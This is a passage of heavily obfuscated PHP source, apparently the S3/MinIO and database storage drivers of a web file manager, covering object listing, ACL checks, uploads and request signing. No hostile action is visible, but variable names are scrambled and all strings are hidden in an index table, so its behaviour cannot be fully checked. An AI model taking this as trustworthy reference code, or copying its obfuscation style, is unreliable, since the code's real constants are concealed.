array($ì¦øôŠç[32] => $this->pathThis($›øğ¥µ¾), $ì¦øôŠç[87] => $this->getPathOuter($›øğ¥µ¾), $ì¦øôŠç[33] => $ì¦øôŠç[230], $ì¦øôŠç[169] => $this->ext($›øğ¥µ¾), $ì¦øôŠç[79] => isset($è¾ÛöÑ¥[$ì¦øôŠç[79]]) ? $è¾ÛöÑ¥[$ì¦øôŠç[79]] : 0); if ($”æöØµ ) { return $©é€àÃÈ; } $©é€àÃÈ[$ì¦øôŠç[231]] = $©é€àÃÈ[$ì¦øôŠç[88]] = 0; $©é€àÃÈ[$ì¦øôŠç[232]] = $©é€àÃÈ[$ì¦øôŠç[233]] = !0; if (empty($è¾ÛöÑ¥)) { $è¾ÛöÑ¥ = $this->objectMeta($›øğ¥µ¾); if (!$è¾ÛöÑ¥) { return $©é€àÃÈ; } } if (isset($è¾ÛöÑ¥[$ì¦øôŠç[234]]) && $è¾ÛöÑ¥[$ì¦øôŠç[234]]) { $©é€àÃÈ[$ì¦øôŠç[235]] = $è¾ÛöÑ¥[$ì¦øôŠç[234]]; } if (isset($è¾ÛöÑ¥[$ì¦øôŠç[206]])) { $©é€àÃÈ[$ì¦øôŠç[88]] = $è¾ÛöÑ¥[$ì¦øôŠç[206]]; } if (isset($è¾ÛöÑ¥[$ì¦øôŠç[79]])) { $©é€àÃÈ[$ì¦øôŠç[79]] = $è¾ÛöÑ¥[$ì¦øôŠç[79]]; } return $©é€àÃÈ; } private function folderInfo($ìô«˜ÅÈ, $Ûæ²ÀÖ¦ = false, $•ôÀí«£ = array()) { $Û¯êûÌ =& $_SERVER[ç¦¬”œš]; $ÕÖ÷ğÑœ = array($Û¯êûÌ[32] => $this->pathThis($ìô«˜ÅÈ), $Û¯êûÌ[87] => $this->getPathOuter($Û¯êûÌ[8] . $ìô«˜ÅÈ), $Û¯êûÌ[33] => $Û¯êûÌ[78]); if ($Ûæ²ÀÖ¦) { return $ÕÖ÷ğÑœ; } $ÕÖ÷ğÑœ[$Û¯êûÌ[231]] = $ÕÖ÷ğÑœ[$Û¯êûÌ[88]] = 0; $ÕÖ÷ğÑœ[$Û¯êûÌ[232]] = $ÕÖ÷ğÑœ[$Û¯êûÌ[233]] = !0; if ($ìô«˜ÅÈ == $Û¯êûÌ[12]) { return $ÕÖ÷ğÑœ; } if (empty($•ôÀí«£)) { $•ôÀí«£ = $this->objectMeta(trim($ìô«˜ÅÈ, $Û¯êûÌ[8]) . $Û¯êûÌ[8]); } if (isset($•ôÀí«£[$Û¯êûÌ[206]])) { $ÕÖ÷ğÑœ[$Û¯êûÌ[231]] = $•ôÀí«£[$Û¯êûÌ[206]]; } return $ÕÖ÷ğÑœ; } private function fileList($…îòÂ±Ó, $¹Ø³¸¤à = '', $ÊÉ•­ˆÎ = 0) { $ì ëˆá‚ =& $_SERVER[ç¦¬”œš]; $ùŸ ¾îÄ = rtrim($…îòÂ±Ó, $ì ëˆá‚[8]) . $ì ëˆá‚[8]; $‹‹ıî¢¹ = $this->listObjs($ùŸ ¾îÄ, null, null, $¹Ø³¸¤à); if (!$‹‹ıî¢¹) { return array($ì ëˆá‚[85] => array(), $ì ëˆá‚[86] => array()); } $Ë•ıöŸ… = $Œƒ‘±¤¼ = array(); foreach ($‹‹ıî¢¹[$ì ëˆá‚[236]] as $±‹¿‰õ¾) { $ş¡™¬Ûá = $±‹¿‰õ¾[$ì ëˆá‚[32]]; if ($ş¡™¬Ûá == $ùŸ ¾îÄ) { continue; } $ÂúóÔá = isset($±‹¿‰õ¾[$ì ëˆá‚[79]]) ? $±‹¿‰õ¾[$ì ëˆá‚[79]] : 0; $Ÿ ¿Äæı = $ÂúóÔá == 0 && substr($ş¡™¬Ûá, strlen($ş¡™¬Ûá) - 1, 1) == $ì ëˆá‚[8] ? !0 : !1; $this->cacheMethodInfoSet($ş¡™¬Ûá, $Ÿ ¿Äæı, $±‹¿‰õ¾); if ($Ÿ ¿Äæı) { $Ë•ıöŸ…[] = $ş¡™¬Ûá; continue; } $Œƒ‘±¤¼[] = $ÊÉ•­ˆÎ ? $±‹¿‰õ¾ : $ş¡™¬Ûá; } foreach ($‹‹ıî¢¹[$ì ëˆá‚[237]] as $±‹¿‰õ¾) { $Ë•ıöŸ…[] = $±‹¿‰õ¾[$ì ëˆá‚[32]]; $this->cacheMethodInfoSet($±‹¿‰õ¾[$ì ëˆá‚[32]], !0); } $this->cacheMethodInfoSet($…îòÂ±Ó, !0); return array($ì ëˆá‚[85] => $Ë•ıöŸ…, $ì ëˆá‚[86] => $Œƒ‘±¤¼); } private function listObjs($¿‚Õúû, $Œ˜ºÖŠË = null, $ÌÊôØ³’ = null, $©Çú©àŠ = null) { $‡ÉçÉ¹Ì =& $_SERVER[ç¦¬”œš]; $¿‚Õúû = trim($¿‚Õúû, $‡ÉçÉ¹Ì[8]); $æ¬ùÁÜ“ = empty($¿‚Õúû) && $¿‚Õúû !== $‡ÉçÉ¹Ì[228] ? $‡ÉçÉ¹Ì[12] : $¿‚Õúû . $‡ÉçÉ¹Ì[8]; return $this->client->getBucket($this->bucket, $æ¬ùÁÜ“, $Œ˜ºÖŠË, $ÌÊôØ³’, $©Çú©àŠ, !0); } public function has($·Ø†şîÏ, $ó½ÍÉøî = false, $İÎµ™ìÖ = true) { $®­Õˆª =& $_SERVER[ç¦¬”œš]; $·Ø†şîÏ = trim($·Ø†şîÏ, $®­Õˆª[8]); $ŸáÉÜ” = empty($·Ø†şîÏ) && $·Ø†şîÏ !== $®­Õˆª[228] ? $®­Õˆª[12] : $·Ø†şîÏ . $®­Õˆª[8]; $îäš½ = null; $ä¶Ä®ïÏ = 500; $öÒ«è•í = $®­Õˆª[8]; $øËª¿Å× = $‰ÖÎØƒû = array(); while (!0) { $ó„Ñù±‘ = $this->listObjs($·Ø†şîÏ, $îäš½, $ä¶Ä®ïÏ, $öÒ«è•í); if (!$ó„Ñù±‘) { break; } $îäš½ = $ó„Ñù±‘[$®­Õˆª[238]]; $°İÖÌÂê = $ó„Ñù±‘[$®­Õˆª[236]]; $ÈÀÌ˜‹ = $ó„Ñù±‘[$®­Õˆª[237]]; if (empty($°İÖÌÂê) && empty($ÈÀÌ˜‹)) { break; } if (count($°İÖÌÂê) == 1 && $°İÖÌÂê[0][$®­Õˆª[32]] == $ŸáÉÜ”) { break; } if ($ó½ÍÉøî) { if (count($°İÖÌÂê)) { $°İÖÌÂê = array_column($°İÖÌÂê, $®­Õˆª[32]); $øËª¿Å× = array_merge($øËª¿Å×, $°İÖÌÂê); } if (count($ÈÀÌ˜‹)) { $ÈÀÌ˜‹ = array_column($ÈÀÌ˜‹, $®­Õˆª[32]); $‰ÖÎØƒû = array_merge($‰ÖÎØƒû, $ÈÀÌ˜‹); } if ($îäš½ === null) { break; } continue; } if ($İÎµ™ìÖ) { if (!empty($°İÖÌÂê)) { if (count($°İÖÌÂê) > 1 || isset($°İÖÌÂê[0][$®­Õˆª[32]]) && $°İÖÌÂê[0][$®­Õˆª[32]] != $ŸáÉÜ”) { return !0; } } } else { if (!empty($ÈÀÌ˜‹)) { return !0; } } if ($îäš½ === null) { break; } } if ($ó½ÍÉøî) { $øËª¿Å× = array_diff($øËª¿Å×, array($ŸáÉÜ”)); $øËª¿Å× = count(array_unique($øËª¿Å×)); $‰ÖÎØƒû = count(array_unique($‰ÖÎØƒû)); return array($®­Õˆª[239] => $øËª¿Å×, $®­Õˆª[240] => $‰ÖÎØƒû); } return !1; } public function listAll($ğİÖçƒ´) { $ášÍà‰¤ =& $_SERVER[ç¦¬”œš]; $ŒÕ¥€ = $this->fileList($ğİÖçƒ´, $ášÍà‰¤[12], !0); $›‡½à•Ø = array_to_keyvalue($ŒÕ¥€[$ášÍà‰¤[86]], $ášÍà‰¤[32]); foreach ($ŒÕ¥€[$ášÍà‰¤[85]] as $ğ„¿šĞŞ) { if (is_string($ğ„¿šĞŞ)) { $›‡½à•Ø[$ğ„¿šĞŞ] = array($ášÍà‰¤[79] => 0); } } return $this->listAllFiles($ğİÖçƒ´, $›‡½à•Ø); } public function canRead($á½Ç¬µã) { $›ŞÏæîä =& $_SERVER[ç¦¬”œš]; $ÊãøÕÙ› = $this->client->getAccessControlPolicy($this->bucket, $á½Ç¬µã); if (!$ÊãøÕÙ›) { return !1; } return in_array($ÊãøÕÙ›, array($›ŞÏæîä[241], $›ŞÏæîä[242], $›ŞÏæîä[243])) ? !0 : !1; } public function canWrite($›Òõı«¤) { $‚©ˆÊÆë =& $_SERVER[ç¦¬”œš]; $®ˆ”ÈÃ• = $this->client->getAccessControlPolicy($this->bucket, $›Òõı«¤); if (!$®ˆ”ÈÃ•) { return !1; } return in_array($®ˆ”ÈÃ•, array($‚©ˆÊÆë[241], $‚©ˆÊÆë[242])) ? !0 : !1; } public function getContent($ÏÆÙÆÓ…) { return $this->client->getObject($this->bucket, $ÏÆÙÆÓ…); } public function setContent($ºÚ¿åÀ€, $ë¬çÚßˆ = '', $¦ÖœµÈ = false) { $³¬œ¡ùô =& $_SERVER[ç¦¬”œš]; $ºÚ¿åÀ€ = $¦ÖœµÈ ? trim($ºÚ¿åÀ€, $³¬œ¡ùô[8]) . $³¬œ¡ùô[8] : $ºÚ¿åÀ€; $©Öšáæ = get_file_mime(get_path_ext($ºÚ¿åÀ€)); $š»¢Ó•¥ = $this->client->putObject($ë¬çÚßˆ, $this->bucket, $ºÚ¿åÀ€, $³¬œ¡ùô[229], array(), $©Öšáæ); if (!$š»¢Ó•¥) { return !1; } if ($¦ÖœµÈ) { return !0; } return $š»¢Ó•¥ ? !0 : !1; } public function fileSubstr($äŒÑµØ˜, $ÇàİÂéÖ, $ïíîöŞÛ) { $ú¡®õé = $ÇàİÂéÖ + $ïíîöŞÛ - 1; return $this->client->getObject($this->bucket, $äŒÑµØ˜, array($_SERVER[ç¦¬”œš][244] => "\142\171\x74\x65\163\x3d{$ÇàİÂéÖ}\x2d{$ú¡®õé}")); } public function upload($…¿¼ä“é, $‰ëØî•‚, $ûçêëş = false, $şıì”ëÕ = REPEAT_REPLACE) { $åÈ‚îşÖ =& $_SERVER[ç¦¬”œš]; $½û¤øÈç = array($åÈ‚îşÖ[245] => @md5_file($‰ëØî•‚)); $«¨ŸŒ¢û = array($åÈ‚îşÖ[246] => get_file_mime(get_path_ext($…¿¼ä“é))); if (IO::size($‰ëØî•‚) <= 1024 * 1024 * 200) { $¼Ï™ê›ç = $this->client->putObjectFile($‰ëØî•‚, $this->bucket, $…¿¼ä“é, $åÈ‚îşÖ[229], $½û¤øÈç, $«¨ŸŒ¢û); return !empty($¼Ï™ê›ç) ? $this->getPathOuter($…¿¼ä“é) : !1; } $µğÏ½”± = $this->client->multiUploadObject($‰ëØî•‚, $this->bucket, trim($…¿¼ä“é, $åÈ‚îşÖ[8]), $½û¤øÈç, $«¨ŸŒ¢û); return $µğÏ½”± ? $this->getPathOuter($…¿¼ä“é) : !1; } public function download($Î¥èóŠ§, $¦Í¹öÏ) { if (!@is_dir($this->pathFather($¦Í¹öÏ)) && !IO::mkdir($this->pathFather($¦Í¹öÏ))) { return !1; } $ãÆÜÜ­­ = $this->client->getObject($this->bucket, $Î¥èóŠ§, array(), $¦Í¹öÏ); return $ãÆÜÜ­­ !== !1 ? $¦Í¹öÏ : !1; } public function link($‰¯ö°•Ÿ, $Ğ…ÏšÂ = array()) { $Ê—¾ëÄŒ =& $_SERVER[ç¦¬”œš]; if ($this->signVer == $Ê—¾ëÄŒ[247]) { return $this->client->getAuthenticatedURL($this->bucket, $‰¯ö°•Ÿ, 3600 * 12, $Ğ…ÏšÂ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($‰¯ö°•Ÿ, $Ê—¾ëÄŒ[8]), 3600 * 12, $this->region, array(), !0, $Ğ…ÏšÂ); } public function fileOut($ÒŠøÏÛ×, $Ğ¨¹è¨ş = false, $îçî·œ = false, $ïçÄ¥ = '') { $§‘–ìÙÙ =& $_SERVER[ç¦¬”œš]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÒŠøÏÛ×, $Ğ¨¹è¨ş, $îçî·œ, $ïçÄ¥); } if (!$îçî·œ) { $îçî·œ = $this->pathThis($ÒŠøÏÛ×); } $ª ¤Èğ = get_file_mime(get_path_ext($îçî·œ)); if ($ª ¤Èğ == $§‘–ìÙÙ[248]) { return parent::fileOut($ÒŠøÏÛ×, $Ğ¨¹è¨ş, $îçî·œ, $ïçÄ¥); } $ŠÛ±´¡ = array($§‘–ìÙÙ[249] => $ª ¤Èğ); if ($Ğ¨¹è¨ş) { $ŠÛ±´¡[$§‘–ìÙÙ[250]] = $§‘–ìÙÙ[251] . rawurlencode($îçî·œ); } else { } $µÜ«•Ó = $this->link($ÒŠøÏÛ×, $ŠÛ±´¡); $this->fileOutLink($µÜ«•Ó); } public function fileOutServer($ÇÓ¯œ‹Ó, $ÄàÌŞ¦ = false, $´ºèÄö° = false, $¿ÕÏïï = '') { parent::fileOut($ÇÓ¯œ‹Ó, $ÄàÌŞ¦, $´ºèÄö°, $¿ÕÏïï); } public function fileOutImageServer($…íŞ›¾, $éç‚Í„ = 250) { parent::fileOutImage($…íŞ›¾, $éç‚Í„); } public function hashMd5($—¬ëí, $ª»“ùİó = '') { $äÀñĞ´” = $this->objectMeta($—¬ëí); if (!$äÀñĞ´”) { return !1; } $ª»“ùİó = $ª»“ùİó ? $ª»“ùİó : _get($äÀñĞ´”, $_SERVER[ç¦¬”œš][252]); return $ª»“ùİó; } public function uploadFormData($áãâïè¢, $ØÛØÜ“ = 3600) { $Ö½×µ‡Û =& $_SERVER[ç¦¬”œš]; $ÉĞòÕ¦ = $this->pathFather($áãâïè¢); $ÛÑ¬¬å® = $this->client->getHttpUploadPostParams($this->bucket, $ÉĞòÕ¦, $Ö½×µ‡Û[229], $ØÛØÜ“); return array_merge((array) $ÛÑ¬¬å®, array($Ö½×µ‡Û[208] => $this->getHost())); } public function multiUploadFormData($¢Š£Ë–, $©Û˜›¥ = 3600) { $–÷§ÙØ¢ =& $_SERVER[ç¦¬”œš]; $¡Ü¬¡ïÈ = gmdate($–÷§ÙØ¢[253]); $ºàáœÛÔ = array(); $úŠ‰ÑÁ = $this->client->getUploadId($this->bucket, $¢Š£Ë–, $ºàáœÛÔ); if (!$úŠ‰ÑÁ) { return !1; } return array($–÷§ÙØ¢[254] => $úŠ‰ÑÁ, $–÷§ÙØ¢[208] => $this->getHost() . $–÷§ÙØ¢[8] . $this->pathEncode($¢Š£Ë–), $–÷§ÙØ¢[255] => $¡Ü¬¡ïÈ, $–÷§ÙØ¢[97] => $¢Š£Ë–); } public function multiUploadAuthData($È€è«Á±, $÷Î¡€Ê˜ = array()) { $Óì†Ï™× =& $_SERVER[ç¦¬”œš]; $å•æŞ¬† = isset($÷Î¡€Ê˜[$Óì†Ï™×[255]]) ? $÷Î¡€Ê˜[$Óì†Ï™×[255]] : gmdate($Óì†Ï™×[253]); $¬–£Ø¸“ = isset($÷Î¡€Ê˜[$Óì†Ï™×[169]]) ? $÷Î¡€Ê˜[$Óì†Ï™×[169]] : $Óì†Ï™×[12]; $³¸•Ü¦Õ = $÷Î¡€Ê˜[$Óì†Ï™×[97]]; unset($÷Î¡€Ê˜[$Óì†Ï™×[97]]); if (isset($÷Î¡€Ê˜[$Óì†Ï™×[256]])) { $÷Î¡€Ê˜[$Óì†Ï™×[255]] = $å•æŞ¬†; return $this->listUploadParts($³¸•Ü¦Õ, $÷Î¡€Ê˜); } $ÖëÚƒ’¿ = array($Óì†Ï™×[257], $Óì†Ï™×[12], $Óì†Ï™×[123], $Óì†Ï™×[12], "\170\55\x61\155\x7a\55\x64\x61\164\145\72{$å•æŞ¬†}", $Óì†Ï™×[8] . $this->bucket . $Óì†Ï™×[8] . $this->pathEncode($³¸•Ü¦Õ) . $¬–£Ø¸“); if (strpos($¬–£Ø¸“, $Óì†Ï™×[258]) === 0) { $ÖëÚƒ’¿[0] = $Óì†Ï™×[259]; } if (isset($÷Î¡€Ê˜[$Óì†Ï™×[260]]) && $÷Î¡€Ê˜[$Óì†Ï™×[260]] == $Óì†Ï™×[261]) { $ÖëÚƒ’¿[0] = $Óì†Ï™×[261]; } $ë¶˜¹– = implode($Óì†Ï™×[262], $ÖëÚƒ’¿); $½¨ˆöŞ˜ = base64_encode(hash_hmac($Óì†Ï™×[263], $ë¶˜¹–, $this->secret, !0)); $¥Ñ±Çé = $Óì†Ï™×[264] . $this->accessKey . $Óì†Ï™×[4] . $½¨ˆöŞ˜; if (strpos($¬–£Ø¸“, $Óì†Ï™×[258]) === 0) { return array($Óì†Ï™×[265] => $¥Ñ±Çé, $Óì†Ï™×[255] => $å•æŞ¬†); } return $¥Ñ±Çé; } public function listUploadParts($æë•œØ, $Œïî Ò = array()) { $ÕÒâëÖò =& $_SERVER[ç¦¬”œš]; $À˜×Â…ƒ = str_replace($ÕÒâëÖò[266], $ÕÒâëÖò[12], $Œïî Ò[$ÕÒâëÖò[169]]); $¿á”Öü˜ = $this->client->listParts($this->bucket, $æë•œØ, $À˜×Â…ƒ); if (!$¿á”Öü˜) { return !1; } unset($Œïî Ò[$ÕÒâëÖò[256]], $Œïî Ò[$ÕÒâëÖò[260]]); $Œïî Ò[$ÕÒâëÖò[97]] = $æë•œØ; $òÙäöç = $this->multiUploadAuthData($æë•œØ, $Œïî Ò); if (empty($òÙäöç)) { return !1; } return array($ÕÒâëÖò[265] => $òÙäöç, $ÕÒâëÖò[255] => $Œïî Ò[$ÕÒâëÖò[255]], $ÕÒâëÖò[267] => $¿á”Öü˜); } public function getHost() { $„Œ¤øÌ£ =& $_SERVER[ç¦¬”œš]; $ºç®¹¡ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($„Œ¤øÌ£[70], $„Œ¤øÌ£[64], $„Œ¤øÌ£[69], $„Œ¤øÌ£[62]))) { return $ºç®¹¡ . $„Œ¤øÌ£[8] . $this->bucket; } $ºç®¹¡ = explode($„Œ¤øÌ£[210], $ºç®¹¡); return $ºç®¹¡[0] . $„Œ¤øÌ£[210] . $this->bucket . $„Œ¤øÌ£[10] . $ºç®¹¡[1]; } public function size($¤ğƒÅóú) { $±úÁ¼üÒ = $this->objectMeta($¤ğƒÅóú); return $±úÁ¼üÒ ? $±úÁ¼üÒ[$_SERVER[ç¦¬”œš][79]] : 0; } public function info($ùãÓ˜Í) { if ($this->isFolder($ùãÓ˜Í)) { return $this->folderInfo($ùãÓ˜Í); } else { if ($this->isFile($ùãÓ˜Í)) { return $this->fileInfo($ùãÓ˜Í); } } return !1; } public function exist($¼¯äü) { return $this->isFile($¼¯äü) || $this->isFolder($¼¯äü); } public function isFile($¦¼“Œóé) { return !$this->isFolder($¦¼“Œóé) && $this->objectMeta($¦¼“Œóé); } public function isFolder($ßºœÇ) { return $this->cacheMethod($_SERVER[ç¦¬”œš][179], $ßºœÇ); } protected function objectMeta($Ü—Î’¦) { return $this->cacheMethod($_SERVER[ç¦¬”œš][181], $Ü—Î’¦); } protected function _objectMeta($ÛÆ“ìÊº) { $òÜçìš® =& $_SERVER[ç¦¬”œš]; $ÛÆ“ìÊº = rtrim($ÛÆ“ìÊº, $òÜçìš®[8]); try { $×ùÏèâ = $this->client->getObjectInfo($this->bucket, $ÛÆ“ìÊº); if (!isset($×ùÏèâ[$òÜçìš®[252]]) && isset($×ùÏèâ[$òÜçìš®[268]])) { $×ùÏèâ[$òÜçìš®[252]] = $×ùÏèâ[$òÜçìš®[268]]; } } catch (Exception $¿åƒ¾) { $×ùÏèâ = !1; } if (!$×ùÏèâ) { } return $×ùÏèâ; } protected function _isFolder($«Ëş÷ü·) { $Â¼öá†â =& $_SERVER[ç¦¬”œš]; $«Ëş÷ü· = rtrim($«Ëş÷ü·, $Â¼öá†â[8]); if ($«Ëş÷ü· == $Â¼öá†â[12] || $«Ëş÷ü· == $Â¼öá†â[8]) { return !0; } $í°¬ÁÖ‡ = $this->client->getBucket($this->bucket, $«Ëş÷ü·, null, 1); if (empty($í°¬ÁÖ‡[$Â¼öá†â[236]])) { return !1; } $­ÙùÎœ¯ = $í°¬ÁÖ‡[$Â¼öá†â[236]][0][$Â¼öá†â[32]]; return stripos($­ÙùÎœ¯, $«Ëş÷ü· . $Â¼öá†â[8]) === 0 ? !0 : !1; if (substr($­ÙùÎœ¯, -1) == $Â¼öá†â[8]) { return !0; } if (get_path_this($­ÙùÎœ¯) == get_path_this($«Ëş÷ü·)) { return !1; } return !0; } public function listObject($¸èä¬Ã…) { return $this->fileList($¸èä¬Ã…, $_SERVER[ç¦¬”œš][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Î¶è‹Êœ) { $š¼±ŞˆÃ =& $_SERVER[ç¦¬”œš]; parent::__construct($Î¶è‹Êœ); $this->setSignVersion($š¼±ŞˆÃ[247]); if (!$this->region) { $this->region = $š¼±ŞˆÃ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $óÇ„©ğÚ = $this->getBucketRgn(); return $this->region == $óÇ„©ğÚ ? !0 : !1; } public function uploadFormData($²³ù¬ïú, $ªàŒ¬è = 3600) { $ëê¬•ã =& $_SERVER[ç¦¬”œš]; $Û‡ŸµÖ = $ëê¬•ã[229]; $˜äúÁÃÑ = $ëê¬•ã[270]; $ãÛÄŒüå = $ëê¬•ã[62]; $ È¢òÓ„ = gmdate($ëê¬•ã[271]); $ ÇÖ’¦ = gmdate($ëê¬•ã[272]); $ûµëŸè = $ëê¬•ã[273]; $æÊ§Şï = $ªàŒ¬è . $ëê¬•ã[12]; $¨Œ€Ëîö = $ëê¬•ã[274]; $ÒÕ¯íŒ÷ = array($this->accessKey, $ ÇÖ’¦, $this->region, $ãÛÄŒüå, $ûµëŸè); $¤ªê¬  = implode($ëê¬•ã[8], $ÒÕ¯íŒ÷); $ùÅ¥ş± = array($ëê¬•ã[275] => gmdate($ëê¬•ã[276], strtotime($ëê¬•ã[277])), $ëê¬•ã[278] => array(array($ëê¬•ã[279] => $this->bucket), array($ëê¬•ã[280] => $Û‡ŸµÖ), array($ëê¬•ã[281], $ëê¬•ã[282], $ëê¬•ã[12]), array($ëê¬•ã[281], $ëê¬•ã[283], $ëê¬•ã[12]), array($ëê¬•ã[281], $ëê¬•ã[284], $ëê¬•ã[12]), array($ëê¬•ã[285] => $¨Œ€Ëîö), array($ëê¬•ã[286] => $¤ªê¬ ), array($ëê¬•ã[287] => $˜äúÁÃÑ), array($ëê¬•ã[288] => $ È¢òÓ„), array($ëê¬•ã[289] => $æÊ§Şï))); $çÊ²­¼ƒ = base64_encode(json_encode($ùÅ¥ş±)); $æåÌ‚ãÓ = hash_hmac($ëê¬•ã[290], $ ÇÖ’¦, $ëê¬•ã[291] . $this->secret, !0); $í“¨Œö¹ = hash_hmac($ëê¬•ã[290], $this->region, $æåÌ‚ãÓ, !0); $„àÂ£İÄ = hash_hmac($ëê¬•ã[290], $ãÛÄŒüå, $í“¨Œö¹, !0); $œŠôØ ± = hash_hmac($ëê¬•ã[290], $ûµëŸè, $„àÂ£İÄ, !0); $²™Ã­ĞÀ = hash_hmac($ëê¬•ã[290], $çÊ²­¼ƒ, $œŠôØ ±); $ïØàÅ‡Ø = array($ëê¬•ã[246] => $ëê¬•ã[12], $ëê¬•ã[292] => $ëê¬•ã[12], $ëê¬•ã[280] => $Û‡ŸµÖ, $ëê¬•ã[285] => $¨Œ€Ëîö, $ëê¬•ã[293] => $çÊ²­¼ƒ, $ëê¬•ã[294] => $¤ªê¬ , $ëê¬•ã[295] => $˜äúÁÃÑ, $ëê¬•ã[296] => $ È¢òÓ„, $ëê¬•ã[297] => $æÊ§Şï, $ëê¬•ã[298] => $²™Ã­ĞÀ, $ëê¬•ã[208] => $this->getHost()); return $ïØàÅ‡Ø; } } goto a®Ï´‹ˆ™¬; EÜğöÑ…È‚: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($éù³õø) { $this->pathParse = $éù³õø; $this->model = Model($_SERVER[ç¦¬”œš][1419]); } public function getPath($üœúÎéÄ) { return trim($üœúÎéÄ, $_SERVER[ç¦¬”œš][8]); } public function pathFather($ğ‚Òß«é) { $¾Æ’«ğ‹ = $this->parse($ğ‚Òß«é); $¾Æ’«ğ‹ = $this->infoSimple($ğ‚Òß«é); return $¾Æ’«ğ‹ ? $¾Æ’«ğ‹[$_SERVER[ç¦¬”œš][192]] : !1; } public function pathThis($Ïœ™Á‡Á) { $ä¼–İÁ = $this->infoSimple($Ïœ™Á‡Á); return $ä¼–İÁ ? $ä¼–İÁ[$_SERVER[ç¦¬”œš][32]] : !1; } public function getPathOuter($ÛÔìûä¢) { if (!$ÛÔìûä¢) { return $ÛÔìûä¢; } $Å¬—Òä© = $this->parse($ÛÔìûä¢); return KodIO::make($Å¬—Òä©[$_SERVER[ç¦¬”œš][484]]); } public function copyFolderFromIO($¬óÙÊÁ, $¢âÓßê´, $›êöŸº, $å´Òóû², $×ùÆ‚º ) { $ØËáÅß½ = $this->model->copyFolderFromIO($¬óÙÊÁ, $¢âÓßê´, $›êöŸº, $å´Òóû², $×ùÆ‚º ); return KodIO::make($ØËáÅß½); } public function isParentOf($ŸäÇßŒê, $¿ˆ¤›Èû) { return $this->model->isParentOf($ŸäÇßŒê, $¿ˆ¤›Èû); } public function mkfile($Ê‚å®ì, $÷ŸÜ’ = '', $Ã‚«Ê¬› = REPEAT_RENAME) { $Òø¸ä– =& $_SERVER[ç¦¬”œš]; $ª‘–æ½¢ = $this->parse($Ê‚å®ì); $Ê‚å®ì = $ª‘–æ½¢[$Òø¸ä–[484]]; for ($’ì½ÄÈ£ = 0; $’ì½ÄÈ£ < count($ª‘–æ½¢[$Òø¸ä–[1420]]); $’ì½ÄÈ£++) { $›¯‚œ•ë = $ª‘–æ½¢[$Òø¸ä–[1420]][$’ì½ÄÈ£]; if ($’ì½ÄÈ£ == count($ª‘–æ½¢[$Òø¸ä–[1420]]) - 1) { $Ê‚å®ì = $this->model->mkfile($Ê‚å®ì, $›¯‚œ•ë, $÷ŸÜ’, $Ã‚«Ê¬›); break; } $Ê‚å®ì = $this->model->mkdir($Ê‚å®ì, $›¯‚œ•ë, REPEAT_SKIP); } return $this->getPathOuter($Ê‚å®ì); } public function mkdir($ö£Îª»¾, $åØ¶„©© = REPEAT_SKIP) { $¢üú–ôî =& $_SERVER[ç¦¬”œš]; $‘Ê–Éğ³ = $this->parse($ö£Îª»¾); $ö£Îª»¾ = $‘Ê–Éğ³[$¢üú–ôî[484]]; for ($Õûë§îÏ = 0; $Õûë§îÏ < count($‘Ê–Éğ³[$¢üú–ôî[1420]]); $Õûë§îÏ++) { $§‰úÌÌò = $‘Ê–Éğ³[$¢üú–ôî[1420]][$Õûë§îÏ]; $ö£Îª»¾ = $this->model->mkdir($ö£Îª»¾, $§‰úÌÌò, $åØ¶„©©); } return $this->getPathOuter($ö£Îª»¾); } public function copyFile($¿ç…ÎŞ‘, $‡†‹¡¿™, $…Şå×ÌÃ = REPEAT_REPLACE) { $Çõ±ãÇ‚ =& $_SERVER[ç¦¬”œš]; $Ã‰‰ªÄı = $this->parse($‡†‹¡¿™); $Õ÷ú¤ÁÏ = $this->model->copy($¿ç…ÎŞ‘, $Ã‰‰ªÄı[$Çõ±ãÇ‚[484]], $…Şå×ÌÃ, $Ã‰‰ªÄı[$Çõ±ãÇ‚[87]]); return $Õ÷ú¤ÁÏ ? $this->getPathOuter($Õ÷ú¤ÁÏ) : !1; } public function moveFile($‰×Ùáô, $ŒÎö¾´é, $ú©õıö§ = REPEAT_REPLACE) { $„¿‹÷÷é =& $_SERVER[ç¦¬”œš]; $€ —£×› = $this->parse($ŒÎö¾´é); $ƒÜÏë…æ = $this->model->move($‰×Ùáô, $€ —£×›[$„¿‹÷÷é[484]], $ú©õıö§, $€ —£×›[$„¿‹÷÷é[87]]); return $ƒÜÏë…æ ? $this->getPathOuter($ƒÜÏë…æ) : !1; } public function copy($Çéú‹», $ì³œãúÏ, $£Ê„›Êû = REPEAT_REPLACE, $‹ •Ù£ = false) { $ É›ŞË = $this->parse($ì³œãúÏ); $®€ê£ªØ = $this->model->copy($Çéú‹», $ É›ŞË[$_SERVER[ç¦¬”œš][484]], $£Ê„›Êû, $‹ •Ù£); return $®€ê£ªØ ? $this->getPathOuter($®€ê£ªØ) : !1; } public function moveSameAllow() { } public function move($Ó…ÀÒ÷, $ìÑ«ÆÛ†, $Ò¼˜óá¿ = REPEAT_REPLACE, $€Íú»ï• = false) { $ª«éğÃ½ = $this->parse($ìÑ«ÆÛ†); $â…ÈóÜÔ = $this->model->move($Ó…ÀÒ÷, $ª«éğÃ½[$_SERVER[ç¦¬”œš][484]], $Ò¼˜óá¿, $€Íú»ï•); return $â…ÈóÜÔ ? $this->getPathOuter($â…ÈóÜÔ) : !1; } public function remove($Ø¨‰Û¦¬, $”•¥œôµ = true) { return $this->model->remove($Ø¨‰Û¦¬, $”•¥œôµ); } public function rename($™‰÷Œ¨·, $µ—Ó×) { $­óÜ¸ª = $this->model->rename($™‰÷Œ¨·, $µ—Ó×); return $­óÜ¸ª ? $this->getPathOuter($™‰÷Œ¨·) : $­óÜ¸ª; } public function size($åá½¿Àª) { $”É»şª¹ = $this->infoSimple($åá½¿Àª); return $”É»şª¹ ? $”É»şª¹[$_SERVER[ç¦¬”œš][79]] : 0; } public function infoSimple($‡åƒğ›Á) { return $this->model->sourceInfo($‡åƒğ›Á); } public function info($üäİË´ì) { return $this->infoParse($üäİË´ì); } public function infoAuth($ñ”íâĞ») { return $this->infoParse($ñ”íâĞ», !1, !0); } public function 